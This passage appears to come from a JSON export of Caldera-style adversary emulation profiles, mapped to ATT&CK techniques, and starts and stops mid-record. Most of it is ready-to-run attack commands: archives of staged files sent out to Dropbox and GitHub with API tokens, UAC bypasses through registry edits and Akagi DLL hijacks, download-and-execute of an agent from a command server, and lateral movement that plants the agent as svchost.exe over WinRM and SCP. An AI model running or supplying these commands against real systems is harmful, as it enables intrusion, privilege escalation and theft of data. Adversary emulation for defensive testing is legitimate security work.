["10fad81e-3f68-47be-83b6-fbee7711c6a9", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}, {"ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505", "ability_name": "Compress staged directory (Password Protected)", "ability_description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "ability_platforms": {"linux": {"sh": {"command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg\n", "cleanup": "rm #{host.dir.staged}.tar.gz.gpg\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh": {"command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.7z\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"], "possible_subsequent_abilities": [["e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "host.dir.compress", "None"], ["4a1120a5-971c-457f-bb07-60641b4723fd", "host.dir.compress", "None"], ["0582dc26-e0cf-4645-88cf-f37a02279976", "host.dir.compress", "None"], ["ea713bc4-63f0-491c-9a6f-0b01d560b87e", "host.dir.compress", "None"], ["3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "host.dir.compress", "None"], ["ba0deadb-97ac-4a4c-aa81-21912fc90980", "host.dir.compress", "None"], ["d754878c-17dd-46dc-891c-a993f8a10336", "host.dir.compress", "None"]]}, {"ability_id": "3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "ability_name": "Exfil Compressed Archive to Dropbox", "ability_description": "This will exfiltrate an archive to Dropbox.", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1567.002", "name": "Exfiltration to Cloud Storage"}, "ability_platforms": {"windows": {"psh": {"command": "$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($SourceFile.name)\";\n$TargetFilePath = \"/#{dropbox.target.dir}/$RemoteName\";\n$ApiKey = \"#{dropbox.api.key}\";\n\n$url = \"https://content.dropboxapi.com/2/files/upload\";\n\n$file = [IO.File]::ReadAllBytes($SourceFile);\n[net.httpWebRequest] $req = [net.webRequest]::create($url);\n\n$arg = '{ \"path\": \"' + $TargetFilePath + '\", \"mode\": \"add\", \"autorename\": true, \"mute\": false }';\n$authorization = \"Bearer \" + $ApiKey;\n\n$req.method = \"POST\";\n$req.Headers.Add(\"Authorization\", $authorization);\n$req.Headers.Add(\"Dropbox-API-Arg\", $arg);\n$req.ContentType = 'application/octet-stream';\n$req.ContentLength = $file.length;\n$req.TimeOut = 50000;\n$req.KeepAlive = $true;\n$req.Headers.Add(\"Keep-Alive: 300\");\n$reqst = $req.getRequestStream();\n$reqst.write($file, 0, $file.length);\n$reqst.flush();\n$reqst.close();\n\n[net.httpWebResponse] $res = $req.getResponse();\n$resst = $res.getResponseStream();\n$sr = new-object IO.StreamReader($resst);\n$result = $sr.ReadToEnd();\n$result;\n$res.close();\n"}}, "linux": {"sh": {"command": "LocalFile='#{host.dir.compress}';\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\ncurl -X POST https://content.dropboxapi.com/2/files/upload\n    --header \"Authorization: Bearer #{dropbox.api.key}\"\n    --header \"Dropbox-API-Arg: {\\\"path\\\": \\\"/#{dropbox.target.dir}/$RemoteName\\\",\\\"mode\\\": \\\"add\\\",\\\"autorename\\\": true,\\\"mute\\\": false,\\\"strict_conflict\\\": false}\"\n    --header \"Content-Type: application/octet-stream\"\n    --data-binary @#{host.dir.compress}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "e4324b88-8836-4803-b6b7-09b3c6cd4e94": {"adversary_name": "Printer Queue", "adversary_description": "Locate files that are queued for printing", "adversary_abilities_in_order": [{"ability_id": "6c91884e-11ec-422f-a6ed-e76774b0daac", "ability_name": "View printer queue", "ability_description": "View details of queued documents in printer queue", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1120", "name": "Peripheral Device Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "lpq -a", "parsers": {"plugins.stockpile.app.parsers.printer_queue": [{"source": "host.print.file", "edge": "has_size", "target": "host.print.size"}]}}}, "linux": {"sh": {"command": "lpq -a", "parsers": {"plugins.stockpile.app.parsers.printer_queue": [{"source": "host.print.file", "edge": "has_size", "target": "host.print.size"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "a41c2324-8c63-4b15-b3c5-84f920d1f226", "ability_name": "Locate file from printer queue", "ability_description": "Locate file that appears in the printer queue", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1083", "name": "File and Directory Discovery"}, "ability_platforms": {"linux": {"sh": {"command": "find ~ -type f -name #{host.print.file} 2>/dev/null", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.system.path"}]}}}, "darwin": {"sh": {"command": "find ~ -type f -name #{host.print.file} 2>/dev/null", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.system.path"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "c724545d-a4cc-492e-8075-2ab9a699c847": {"adversary_name": "You Shall (Not) Bypass", "adversary_description": "This adversary consists of several abilities to bypass UAC on an updated Windows 10 system", "adversary_abilities_in_order": [{"ability_id": "665432a4-42e7-4ee1-af19-a9a8c9455d0c", "ability_name": "UAC bypass registry", "ability_description": "Set a registry key to allow UAC bypass", "ability_tactic": "privilege-escalation", "ability_technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}, "ability_platforms": {"windows": {"psh": {"command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "95ad5d69-563e-477b-802b-4855bfb3be09", "ability_name": "wow64log DLL Hijack", "ability_description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe", "ability_tactic": "privilege-escalation", "ability_technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}, "ability_platforms": {"windows": {"cmd,psh": {"command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n", "payloads": ["Akagi64.exe"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "e99cce5c-cb7e-4a6e-8a09-1609a221b90a", "ability_name": "duser/osksupport DLL Hijack", "ability_description": "UIPI bypass with uiAccess application", "ability_tactic": "privilege-escalation", "ability_technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}, "ability_platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n", "payloads": ["Akagi64.exe"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "e3db134c-4aed-4c5a-9607-c50183c9ef9e", "ability_name": "Bypass UAC Medium", "ability_description": "Bypass user account controls - medium", "ability_tactic": "privilege-escalation", "ability_technique": {"attack_id": "T1548.002", "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"}, "ability_platforms": {"windows": {"psh": {"command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n", "payloads": ["Bypass-UAC.ps1"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "09ad625e-6cba-490f-afe3-5417e7edb9c6": {"adversary_name": "Advanced Thief via GitHub Repo", "adversary_description": "Find, stage, and exfiltrate sensitive files to GitHub Repository", "adversary_abilities_in_order": [{"ability_id": "10fad81e-3f68-47be-83b6-fbee7711c6a9", "ability_name": "Advanced File Search and Stager", "ability_description": "Highly configurable file finder and stager for Linux and Windows. Drops a payload file to the host to parse\narguments rather than running multiple commands for each fact (e.g., each file type). This ability allows for a safe\nmode, only staging files found that have the appropriate file ending. The staging directory is configurable but\ndefaults to the current user's Recycle Bin (Windows) and /tmp (Linux). Payload files include default values for all\nparameters (matching the base fact source - File Search and Stage). Options for searches: file extensions (include,\nexclude [windows]), directories (include, exclude), accessed date cutoff, modified date cutoff, sensitive search\nstrings in files or titles.\n", "ability_tactic": "collection", "ability_technique": "None", "ability_platforms": "None", "id_dependence_fact_tuple -- (id, dependency, fact)": ["10fad81e-3f68-47be-83b6-fbee7711c6a9", "None", "host.dir.staged"], "possible_subsequent_abilities": [["a201bec2-a193-4b58-bf0e-57fa621da474", "host.dir.staged", "None"], ["5c5b0392-1daa-45e1-967c-2f361ce78849", "host.dir.staged", "host.dir.compress"], ["300157e5-f4ad-4569-b533-9d1fa0e74d74", "host.dir.staged", "host.dir.compress"], ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"]]}, {"ability_id": "30a8cf10-73dc-497c-8261-a64cc9e91505", "ability_name": "Compress staged directory (Password Protected)", "ability_description": "This ability packages staged files into a password-protected archive. Note - Requires 7Z for Windows and GPG version 2.1+ for Linux", "ability_tactic": "collection", "ability_technique": {"attack_id": "T1560.001", "name": "Archive Collected Data: Archive via Utility"}, "ability_platforms": {"linux": {"sh": {"command": "tar -C #{host.dir.staged} -czf - . | gpg -c --pinentry-mode=loopback --passphrase #{host.archive.password} > #{host.dir.staged}.tar.gz.gpg && echo #{host.dir.staged}.tar.gz.gpg\n", "cleanup": "rm #{host.dir.staged}.tar.gz.gpg\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}, "windows": {"psh": {"command": "& \"C:\\Program Files\\7-Zip\\7z.exe\" a \"#{host.dir.staged}.7z\" \"#{host.dir.staged}\\*\" \"-p#{host.archive.password}\" | Out-Null;\nsleep 1; ls #{host.dir.staged}.7z | foreach {$_.FullName} | select\n", "cleanup": "rm #{host.dir.staged}.7z\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.dir.compress"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["30a8cf10-73dc-497c-8261-a64cc9e91505", "host.dir.staged", "host.dir.compress"], "possible_subsequent_abilities": [["e7bf5dc7-62e4-48b2-acf8-abaf8734c19c", "host.dir.compress", "None"], ["4a1120a5-971c-457f-bb07-60641b4723fd", "host.dir.compress", "None"], ["0582dc26-e0cf-4645-88cf-f37a02279976", "host.dir.compress", "None"], ["ea713bc4-63f0-491c-9a6f-0b01d560b87e", "host.dir.compress", "None"], ["3ce95a28-25fc-4a7e-a0cd-0fdb190e2081", "host.dir.compress", "None"], ["ba0deadb-97ac-4a4c-aa81-21912fc90980", "host.dir.compress", "None"], ["d754878c-17dd-46dc-891c-a993f8a10336", "host.dir.compress", "None"]]}, {"ability_id": "4a1120a5-971c-457f-bb07-60641b4723fd", "ability_name": "Exfil Compressed Archive to Github Repository", "ability_description": "This will exfiltrate a given compressed directory to a GitHub repository. It assumes that all the facts supplied are valid.", "ability_tactic": "exfiltration", "ability_technique": {"attack_id": "T1567.001", "name": "Exfiltration to Code Repository"}, "ability_platforms": {"linux": {"sh": {"command": "GHUser=\"#{github.user.name}\";\nGHRepo=\"#{github.repository.name}\";\nGHPAT=\"#{github.access.token}\";\nGHBranch='#{github.repository.branch}';\nLocalFile='#{host.dir.compress}';\nHeader=\"Authorization: token $GHPAT\";\nRemoteName=\"$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)\";\necho \"{\\\"message\\\":\\\"Committed $RemoteName\\\", \\\"branch\\\":\\\"$GHBranch\\\", \\\"content\\\":\\\"\" >/tmp/b64;\nbase64 -w 0 $LocalFile >>/tmp/b64;\necho \"\\\"}\" >>/tmp/b64;\ncontent=$(curl -s -X PUT -H \"Accept: application/vnd.github.v3+json\" -H \"$Header\" https://api.github.com/repos/$GHUser/$GHRepo/contents/$RemoteName -d @/tmp/b64);\nrm /tmp/b64;\n"}}, "windows": {"psh,pwsh": {"command": "$GHUser = \"#{github.user.name}\";\n$GHRepo = \"#{github.repository.name}\";\n$GHPAT = \"#{github.access.token}\";\n$GHBranch = '#{github.repository.branch}';\n$token = $GHUser + \":\" + $GHPAT;\n$basetoken = [System.Convert]::ToBase64String([char[]]$token);\n$Headers = @{\n    Authorization = 'Basic {0}' -f $basetoken;\n};\n$file = (Get-Item #{host.dir.compress});\n$RemoteName = \"$(Get-Date -Format yyyymmddhhmmss)-exfil-#{paw}-$($file.name)\";\n$uri = \"https://api.github.com/repos/\" + $GHUser + \"/\" + $GHRepo + \"/contents/\" + $RemoteName;\n\n$FileBytes = Get-Content -Path $file.FullName -Encoding Byte;\n$Base64EncodedFileBytes = [System.Convert]::ToBase64String($FileBytes);\n$Body = @{\n    path = $RemoteName;\n    branch = $GHBranch;\n    content = $Base64EncodedFileBytes;\n    encoding = 'base64';\n    message = \"Committed \" + $RemoteName;\n} | ConvertTo-Json;\ntry {\n  $content = Invoke-RestMethod -Headers $Headers -Uri $uri -Body $Body -Method Put -ErrorAction SilentlyContinue;\n} catch {\n  if ($PSItem -notmatch \"but expected\") { $PSItem; }\n}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "725226e0-45b8-4432-84ee-144d3f37ff8d": {"adversary_name": "Windows Worm #2\n", "adversary_description": "Move laterally with WinRM and WinRM", "adversary_abilities_in_order": [{"ability_id": "85341c8c-4ecb-4579-8f53-43e3e91d7617", "ability_name": "Collect ARP details", "ability_description": "Locate all active IP and FQDNs on the network", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "linux": {"sh": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}, "windows": {"psh,cmd": {"command": "arp -a", "parsers": {"plugins.stockpile.app.parsers.ipaddr": [{"source": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["85341c8c-4ecb-4579-8f53-43e3e91d7617", "None", "remote.host.ip"], "possible_subsequent_abilities": []}, {"ability_id": "fa4ed735-7006-4451-a578-b516f80e559f", "ability_name": "Reverse nslookup IP", "ability_description": "Find hostname of remote IP in domain", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.reverse_nslookup": [{"source": "remote.host.fqdn", "edge": "has_ip", "target": "remote.host.ip"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["fa4ed735-7006-4451-a578-b516f80e559f", "None", "remote.host.fqdn"], "possible_subsequent_abilities": [["921055f4-5970-4707-909e-62f594234d91", "remote.host.fqdn", "remote.host.fqdn"], ["2afae782-6d0a-4fbd-a6b6-d1ce90090eac", "remote.host.fqdn", "remote.host.fqdn"], ["95727b87-175c-4a69-8c7a-a5d82746a753", "remote.host.fqdn", "None"], ["aa6ec4dd-db09-4925-b9b9-43adeb154686", "remote.host.fqdn", "remote.host.fqdn"], ["65048ec1-f7ca-49d3-9410-10813e472b30", "remote.host.fqdn", "remote.host.fqdn"]]}, {"ability_id": "4908fdc4-74fc-4d7c-8935-26d11ad26a8d", "ability_name": "Copy 54ndc47 (WinRM and SCP)", "ability_description": "Copy 54ndc47 to remote host (powershell 5 or newer only) or SCP", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1570", "name": "Lateral Tool Transfer"}, "ability_platforms": {"windows": {"psh,pwsh": {"command": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  $location = \"#{location}\";\n  $exe = \"#{exe_name}\";\n  Copy-Item $location -Destination \"C:\\Users\\Public\\svchost.exe\" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "cleanup": "$job = Start-Job -ScriptBlock {\n  $username = \"#{domain.user.name}\";\n  $password = \"#{domain.user.password}\";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName \"#{remote.host.name}\" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item \"C:\\Users\\Public\\svchost.exe\" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n", "payloads": ["sandcat.go-windows"]}}, "darwin": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-darwin"]}}, "linux": {"sh": {"command": "scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n", "cleanup": "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", "payloads": ["sandcat.go-linux"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "41bb2b7a-75af-49fd-bd15-6c827df25921", "ability_name": "Start Agent (WinRM)", "ability_description": "Start Agent using WinRM (WinRM)", "ability_tactic": "lateral-movement", "ability_technique": {"attack_id": "T1021.006", "name": "Remote Services: Windows Remote Management"}, "ability_platforms": {"windows": {"psh": {"command": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{cmd.exe /c start C:\\Users\\Public\\svchost.exe -server #{server} }};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "cleanup": "$username = \"#{domain.user.name}\";\n$password = \"#{domain.user.password}\";\n$secstr = New-Object -TypeName System.Security.SecureString;\n$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n$cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n$session = New-PSSession -ComputerName #{remote.host.name} -Credential $cred;\nInvoke-Command -Session $session -ScriptBlock{start-job -scriptblock{Get-Process cmd | Where-Object Path -eq C:\\Users\\Public\\svchost.exe | Stop-Process}};\nStart-Sleep -s 5;\nRemove-PSSession -Session $session;\n", "payloads": ["sandcat.go-windows"]}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}]}, "0f4c3c67-845e-49a0-927e-90ed33c044e0": {"adversary_name": "Discovery", "adversary_description": "A discovery adversary", "adversary_abilities_in_order": [{"ability_id": "c0da588f-79f0-4263-8998-7496b1a40596", "ability_name": "Identify active user", "ability_description": "Find user running agent", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1033", "name": "System Owner/User Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "linux": {"sh": {"command": "whoami", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}, "windows": {"psh": {"command": "$env:username\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}, "cmd": {"command": "echo %username%", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}, {"source": "domain.user.name"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["c0da588f-79f0-4263-8998-7496b1a40596", "None", "host.user.name"], "possible_subsequent_abilities": [["3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "host.user.name", "None"], ["3796a00b-b11d-4731-b4ca-275a07d83299", "host.user.name", "None"]]}, {"ability_id": "c1cd6388-3ced-48c7-a511-0434c6ba8f48", "ability_name": "Find local users", "ability_description": "Get a list of all local users", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1087.001", "name": "Account Discovery: Local Account"}, "ability_platforms": {"darwin": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}, "linux": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "feaced8f-f43f-452a-9500-a5219488abb8", "ability_name": "Identify local users", "ability_description": "Identify all local users", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1087.001", "name": "Account Discovery: Local Account"}, "ability_platforms": {"darwin": {"sh": {"command": "dscl . list /Users | grep -v '_'\n"}}, "windows": {"psh": {"command": "Get-WmiObject -Class Win32_UserAccount\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "b6f545ef-f802-4537-b59d-2cb19831c8ed", "ability_name": "Snag broadcast IP", "ability_description": "Capture the local network broadcast IP address", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1016", "name": "System Network Configuration Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "ifconfig | grep broadcast"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "3b5db901-2cb8-4df7-8043-c4628a6a5d5a", "ability_name": "Find user processes", "ability_description": "Get process info for processes running as a user", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1057", "name": "Process Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "linux": {"sh": {"command": "ps aux | grep #{host.user.name}\n"}}, "windows": {"psh": {"command": "$owners = @{};\ngwmi win32_process |% {$owners[$_.handle] = $_.getowner().user};\n$ps = get-process | select processname,Id,@{l=\"Owner\";e={$owners[$_.id.tostring()]}};\nforeach($p in $ps) {\n    if($p.Owner -eq \"#{host.user.name}\") {\n        $p;\n    }\n}\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "530e47c6-8592-42bf-91df-c59ffbd8541b", "ability_name": "View admin shares", "ability_description": "Network Share Discovery", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1135", "name": "Network Share Discovery"}, "ability_platforms": {"windows": {"pwsh,psh": {"command": "Get-SmbShare | ConvertTo-Json", "parsers": {"plugins.stockpile.app.parsers.json": [{"source": "domain.smb.share", "custom_parser_vals": {"json_key": "Path", "json_type": "str"}}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["530e47c6-8592-42bf-91df-c59ffbd8541b", "None", "domain.smb.share"], "possible_subsequent_abilities": []}, {"ability_id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517", "ability_name": "Discover domain controller", "ability_description": "Identify the remote domain controllers", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "2dece965-37a0-4f70-a391-0f30e3331aba", "ability_name": "Discover antivirus programs", "ability_description": "Identify AV", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}, "ability_platforms": {"darwin": {"sh": {"command": "find /Applications/ -maxdepth 2 -iname *.app | grep -io \"[a-z ]*\\.app\" | grep -Ei -- \"symantec|norton|bitdefender|kapersky|eset|avast|avira|malwarebytes|sophos|(trend micro)\"\n", "parsers": {"plugins.stockpile.app.parsers.antivirus": [{"source": "host.installed.av"}]}}}, "windows": {"psh": {"command": "wmic /NAMESPACE:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.installed.av"}]}}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": ["2dece965-37a0-4f70-a391-0f30e3331aba", "None", "host.installed.av"], "possible_subsequent_abilities": []}, {"ability_id": "5c4dd985-89e3-4590-9b57-71fed66ff4e2", "ability_name": "Permission Groups Discovery", "ability_description": "Summary of permission and security groups", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1069.001", "name": "Permission Groups Discovery: Local Groups"}, "ability_platforms": {"windows": {"psh": {"command": "gpresult /R\n"}}, "darwin": {"sh": {"command": "groups"}}, "linux": {"sh": {"command": "groups"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "8c06ebf8-bacf-486b-bd77-21ba8c5a5777", "ability_name": "Identify Firewalls", "ability_description": "Identify Firewalls", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1518.001", "name": "Software Discovery: Security Software Discovery"}, "ability_platforms": {"windows": {"psh": {"command": "$NameSpace = Get-WmiObject -Namespace \"root\" -Class \"__Namespace\" | Select Name | Out-String -Stream | Select-String \"SecurityCenter\";\n$SecurityCenter = $NameSpace | Select-Object -First 1;\nGet-WmiObject -Namespace \"root\\$SecurityCenter\" -Class AntiVirusProduct | Select DisplayName, InstanceGuid, PathToSignedProductExe, PathToSignedReportingExe, ProductState, Timestamp | Format-List;\n"}}}, "id_dependence_fact_tuple -- (id, dependency, fact)": "None", "possible_subsequent_abilities": "None"}, {"ability_id": "ce485320-41a4-42e8-a510-f5a8fe96a644", "ability_name": "Discover Mail Server", "ability_description": "Identify the organizations mail server", "ability_tactic": "discovery", "ability_technique": {"attack_id": "T1018", "name": "Remote System Discovery"}, "ability_platforms": {"linux": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "darwin": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "windows": {"psh": {"command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": 